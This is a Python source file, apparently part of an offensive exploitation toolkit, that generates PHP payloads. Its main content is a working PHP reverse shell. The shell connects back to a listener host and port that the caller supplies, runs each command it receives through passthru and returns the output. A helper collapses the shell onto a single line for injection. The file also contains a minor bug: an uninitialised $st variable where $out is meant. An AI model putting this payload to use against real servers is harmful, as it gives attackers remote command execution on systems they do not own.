class PhpShellcodes:
    """
        Class with shellcodes for php language
    """

    def __init__(self):
        self.name = ""
        return

    def get_phpinfo(self, badchars):
        """ Function to get phpinfo """

        phpcode = "<?php phpinfo(); ?>"

        return phpcode

    def get_phpcode(self, localhost, localport):
        """ Function to get php shellcode """

        if not localhost or not localport:
            print "Settings for connectback listener must be defined"
            return False

        phpcode = ""
        phpcode += """
<?php
    $address="LOCALHOST";
    $port="LOCALPORT";
    $buff_size=2048;
    $timeout=120;

    $sock=socket_create(AF_INET,SOCK_STREAM,0) or die("Cannot create a socket");
    socket_set_option($sock,SOL_SOCKET,SO_RCVTIMEO,array('sec'=>$timeout,'usec'=>0));
    socket_set_option($sock,SOL_SOCKET,SO_SNDTIMEO,array('sec'=>$timeout,'usec'=>0));
    socket_connect($sock,$address,$port) or die("Could not connect to the socket");

    while ($read=socket_read($sock,$buff_size)) {
        $out="";
        if ($read) {
            if (strcmp($read,"quit")===0 || strcmp($read,"q")===0) {
                break;
            }

            ob_start();
            passthru($read);
            $out=ob_get_contents();
            ob_end_clean();
        }

        $length=strlen($out);
        while (1) {
            $sent=socket_write($sock,$out,$length);
            if ($sent===false) {
                break;
            }

            if ($sent<$length) {
                $st=substr($st,$sent);
                $length-=$sent;
            } else {
                break;
            }
        }
    }
    socket_close($sock);
?>
"""

        phpcode = phpcode.replace("LOCALHOST", str(localhost))
        phpcode = phpcode.replace("LOCALPORT", str(localport))

        return phpcode

    def get_php_code_inline(self, host, port):
        res = self.get_phpcode(host, port)
        res = res.replace('\n', '')
        res = res.replace('\r', '')
        return res
